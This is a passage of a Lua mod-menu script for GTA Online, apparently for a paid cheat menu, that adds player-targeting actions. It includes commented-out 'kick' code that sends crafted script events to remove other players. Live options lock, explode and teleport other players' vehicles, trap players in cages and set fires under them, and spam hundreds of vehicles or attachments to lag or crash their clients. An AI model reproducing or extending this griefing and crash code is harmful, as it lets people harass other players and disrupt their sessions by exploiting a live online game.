				1841943281
			}
			for i = 1, 30 do
				local hash_cherax = cherax_kicks[math.random(1, #cherax_kicks)]
				send_script_event(hash_cherax, pid, {pid, -26800537, math.random(-147264233, 194938483), -13000488, 59643555, hash_cherax, 91870118, -3283691})
			end
			notification("Cherax's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)

	menu.action(kickv11,"Impulse's kick (broken)", {}, "", function() -- ratpulse kick
		if pid ~= players.user() and players.exists(pid) then -- real logged ratpulse kick ez
			local impulse_kicks = {
				-1890951223,
				699592812,
				1922258436,
				-1252906024,
				1101235920,
				121406262,
				-1256990787,
				-1054826273,
				1620254541,
				1317868303,
				1401831542,
				2099816323,
				-1491386500,
				-435067392,
				1428412924,
				-1212832151,
				1347850743,
				-1729804184,
				1881968783,
				-1559754940,
				-442306200,
				733106126,
				-966559987
			}
			for i = 1, 50 do
				local hash_impulse = impulse_kicks[math.random(1, #impulse_kicks)]
				send_script_event(hash_impulse, pid, {pid, -26800537, math.random(-147264233, 194938483), -21482748, 59643555, hash_impulse, 91870118, -3283691})
			end
			notification("Impulse's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)

	menu.action(kickv11,"Midnight's kick (broken)", {}, "Works on X-Force", function() -- midnight kick
		if pid ~= players.user() and players.exists(pid) then -- for some reason this kick when sent from midnight itself it blackscreens 2t1 lol but doesnt work here idk but it kicks so idc
			KickV10(pid, 2) 
			notification("Midnight's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)]]









	vehopts = menu.list(main, "Vehicle Events", {}, "Works only if you are standing near to selected player", function(); end) -- blatant vehfucker3000 skid here
	
	lock_sub_vehicle_tab = menu.list(vehopts, "Lock Options", {}, "", function(); end)
	mov_sub_vehicle_tab = menu.list(vehopts, "Movement Options", {}, "", function(); end)
	troll_sub_vehicle_tab = menu.list(vehopts, "Trolling Options", {}, "", function(); end)
	health_sub_vehicle_tab = menu.list(vehopts, "Health and Appearance Options", {}, "", function(); end)
	detach_sub_vehicle_tab = menu.list(vehopts, "Detach Options", {}, "", function(); end)
	plane_sub_vehicle_tab = menu.list(vehopts, "Plane and Helicopter Options", {}, "", function(); end)

	menu.action(vehopts,"Spawn them a vehicle", {}, "Spawns a vehicle on target player", function()
		menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
		notification("now type the name of the vehicle in the command box", false, true)
	end)




	menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end)

	menu.action(troll_sub_vehicle_tab,"727 Plate Text", {"727plate"}, "Sets player's vehicle plate text to 727", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "727") -- only men of culture will understand ;)
		end
	end)

	menu.action(troll_sub_vehicle_tab,"COCK Plate Text", {"cockplate"}, "Sets player's vehicle plate text to COCK", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "COCK") 
		end
	end)

	menu.action(troll_sub_vehicle_tab,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRASH")
		end
	end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"fixvehshl"}, "Repairs player's vehicle but don't repair it's engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Quick Upgrade Vehicle", {"ugveh"}, "Upgrades player's vehicle",function()
		upgrade_vehicle(pid)
	end)

	menu.action(health_sub_vehicle_tab,"Disable Invincibility", {"removeinv"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Enable Invincibility", {"giveinv"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Destroy Engine", {"killveh"}, "Destroys vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Revive Engine", {"reviveh"}, "Revives vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Explode Vehicle", {"explodeveh"}, "Explodes vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			--local pos = ENTITY.GET_ENTITY_COORDS(vehicle)--tried around with EXPLODE_VEHICLE but didnt work mayb im just rarted
			--FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 7, 1000, true, false, 1, false)
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Reset Acceleration", {"reacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Boost Acceleration", {"boostacc"}, "Sets max speed of vehicle to 9999999",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Trash Acceleration", {"tacc"}, "Sets max speed of vehicle to INT_MIN",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
	end)
		
	menu.action(mov_sub_vehicle_tab,"East", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"West", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"South", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"North", {"northveh"}, "Boosts player's vehicle in the North direction",function()
		northp_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Up", {"launchup"}, "Shoots player up",function()
		launch_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Down", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)

	--[[menu.action(mov_sub_vehicle_tab,"Fuck Their Vehicle", {"fuckveh"}, "Fuck player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
		end
		util.yield(100)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)]]

	---menu.action(main,"delete vehicle", {"delveh"}, "Deletes player's vehicle",function() <-- help
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
	---		VEHICLE.DELETE_VEHICLE(vehicle) 
	---	end
	---end)

	menu.action(detach_sub_vehicle_tab,"Detach Trailer", {"detachtrailer"}, "Detaches attached trailer",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
		end
	end)

	menu.action(detach_sub_vehicle_tab,"Detach from Cargobob", {"detachcbob"}, "Detaches from Cargobob",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Lock Doors", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Unlock Doors", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Drivable", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Undrivable", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Deploy Landing Gear", {"landing1"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Retract Landing Gear", {"landing0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 3)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Disable Cargobob's Hook", {"nohook"}, "Disables cargobob's hook. when used, that cargobob's hook will no longer work",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(vehicle)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Strong Turbulence", {"turb1"}, "Makes turbulence stronger",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"No Turbulence", {"turb0"}, "Makes turbulence weaker",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 0.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 100%", {"propel100"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 0%", {"propel0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 0.0)		
		end
	end)

	---menu.action(plane_sub_vehicle_tab,"Destroy Rear Helicopter Roter", {"bunlockcar"}, "",function() <--- I have no ideas what am I doing here
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_HELI_TAIL_ROTOR_HEALTH(vehicle, 0)		
	---	end
	---end)

	menu.action(lock_sub_vehicle_tab,"Lock that bitch in", {"blockcar"}, "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LOCKED")
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Release that bitch out", {"bunlockcar"}, "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "URFREE")		
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Teleport to me", {"tp2me"}, "Tries to teleport player's vehicle to you",function()
		local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
	end)
	menu.action(mov_sub_vehicle_tab,"Teleport to ocean", {"tp2sea"}, "Tries to teleport player's vehicle to the ocean",function()	
		tp_veh_to(pid,15000,15000,0)
	end)


	
	griefing = menu.list(main, "Griefing", {}, "", function(); end)
	crashevents = menu.list(main, "Remove", {}, "", function(); end)



	cage_options = menu.list(griefing, "Cage Options", {}, "")
	
	menu.divider(cage_options, "Cage Options")

	menu.action(cage_options, "Simple", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle")
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)
---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object

		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)


---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)

	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Average Ozark User", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------



	menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object

		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "Atomatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle")
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again")
				::continue::
			end
			util.yield(1000)
		end
	end)



	
menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("prop_beach_fire")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.SET_ENTITY_AS_NO_LONGER_NEEDED(cage_object)
end)








	menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			util.delete_entity(value)
		end
	end)




	menu.action(griefing, "Orbliterate", {"orbliterate"}, "Press once to target, twice to fire. Stop spectating to cancel :)", function(on_click)
        if waiting then
            do_fade_in(pid)
            notification("Click again to fire!", false, true)
            return 
        end
        waiting = true
        if not NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() then
            do_fade_in(pid)
            return
        end
        util.toast("FIRE!")
        orbital(pid) 
        do_fade_out(pid)
        
    end) 

	menu.action(griefing, "Attach Guitar", {}, "Attaches a guitar to their ped causing crazy things if they're in a vehicle", function() -- wiriscript <3
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		pos.z = pos.z - 0.9
		local object_hash = util.joaat("prop_acc_guitar_01_d1")
		STREAMING.REQUEST_MODEL(object_hash)
		while not STREAMING.HAS_MODEL_LOADED(object_hash) do
			util.yield()
		end
		local object = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
		if object == 0 then 
			notification("Failure creating the entity", true, true)
		end
		ENTITY.ATTACH_ENTITY_TO_ENTITY(object, PLAYER.GET_PLAYER_PED(pid), PED.GET_PED_BONE_INDEX(PLAYER.GET_PLAYER_PED(pid), 0x5c01), 0.5, -0.1, 0.1, 0, 70, 0, false, true, true --[[Collision - This causes glitch when in vehicle]], false, 0, true)
		--ENTITY.SET_ENTITY_VISIBLE(object, false, 0) --turns guitar invisible
		util.yield(3000)
		if player_ped ~= ENTITY.GET_ENTITY_ATTACHED_TO(object) then
			notification("The entity is not attached. Meaby "..PLAYER.GET_PLAYER_NAME(pid).." has attactment protections", true, true)
			return
		end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
	end)

	menu.action(griefing,"Attachment Array", {}, "May lead to a self crash", function()
		notification("Started attaching vehicles", true, true)
		for i = 1, 5 do
			for veh = 1, #attachvehs do
				attach_vehicle(attachvehs[veh], pid)
			end
		end
		notification("Done", true, true)
	end)

	menu.action(griefing,"Bunny's Lag Player", {}, "", function() -- cpu burn simulator
		notification("Started", true, true)
		for i = 1, 5 do
			if players.exists(pid) then
				attach_vehicle_to_ped(attachvehs, "MP_M_Cocaine_01", pid, 10)
				attach_vehicle_to_ped(volatols, "MP_M_Cocaine_01", pid, 60)
				attach_vehicle_to_ped(bombushkas, "MP_M_Cocaine_01", pid, 60)
				attach_vehicle_to_ped(kosatkas, "MP_M_Cocaine_01", pid, 60)
				attach_vehicle_to_ped(cargoplanes, "MP_M_Cocaine_01", pid, 60)
				attach_vehicle_to_ped(alkonosts, "MP_M_Cocaine_01", pid, 60)
				attach_vehicle_to_ped(planes, "MP_M_Cocaine_01", pid, 20)
				attach_vehicle_to_ped(bigvehs, "MP_M_Cocaine_01", pid, 30)
			end
		end
		notification("Done", true, true) -- cpu burned congrats
	end)

	menu.action(griefing,"Volatol Spam Player", {}, "spams volatols on target player, huge AOE", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		notification("Started", true, true)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 500
		while spam_amount >= 1 do
			util.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", true, true) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)

	menu.action(griefing,"Attach Ladder", {}, "", function()
		attach_ladder(ladder, 0.8, 3.55, 0, 1.55, 1.55, 3.35, false, pid)
		attach_ladder(ladder, -0.8, -3.55, 0, 1.55, 181.55, 3.35, false, pid)
		attach_ladder(ladder, -3.55, 1, 0, 1.55, 91.55, 3.35, false, pid)
		attach_ladder(ladder, -3.55, 0.9, 0, 1.55, 91.55, 3.35, false, pid)
		attach_ladder(ground, 0, 0, -2, 0, 0, -2, false, pid)
	end)
----------------------------------------------------------------------------------------------------------------------- attacker buzzard --------------------------------------------------------

	local gunner_weapon_list = {              --these are the buzzard's gunner weapons 
	{"Combat MG", "weapon_combatmg"},
	{"RPG", "weapon_rpg"}
}

buzzard_entities = {}
function spawn_buzzard(pid, gunner_weapon, collision)
	local player_ped =  PLAYER.GET_PLAYER_PED(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
	pos.x = pos.x + math.random(-20, 20)
	pos.y = pos.y + math.random(-20, 20)
	pos.z = pos.z + math.random(20, 40)

